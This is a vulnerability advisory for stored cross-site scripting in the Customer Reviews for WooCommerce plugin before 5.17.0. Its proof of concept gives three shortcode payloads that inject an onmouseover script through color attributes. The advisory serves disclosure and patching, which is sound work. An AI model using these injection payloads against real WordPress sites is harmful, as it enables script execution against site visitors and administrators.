## WordPress Plugin Vulnerabilities

# Customer Reviews for WooCommerce < 5.17.0 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in a page/post where the shortcode is embed, which could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks.

### Proof of Concept

[cusrev\_reviews\_grid color\_brdr='red; border-width:10px;" onmouseover="alert(/XSS/)"']
[cusrev\_reviews\_slider color\_brdr='red; border-width:10px;" onmouseover="alert(/XSS/)"]
[cusrev\_reviews\_grid color\_ex\_brdr='"onmouseover="alert(/XSS/)//']
Affected attributes:
- Fixed in 5.16.0: color\_brdr, color\_bcrd, color\_pr\_bcrd, color\_stars
- Fixed in 5.17.0 for the reviews\_grid shortcode: color\_ex\_brdr, color\_ex\_bcrd
Note: The “Enable shortcodes and Gutenberg blocks” in Reviews Settings needs to be enabled. You can find this setting in the Shortcode tab (/wp-admin/admin.php?page=cr-reviews-settings&tab=shortcodes), and at least one review needs to be in the database
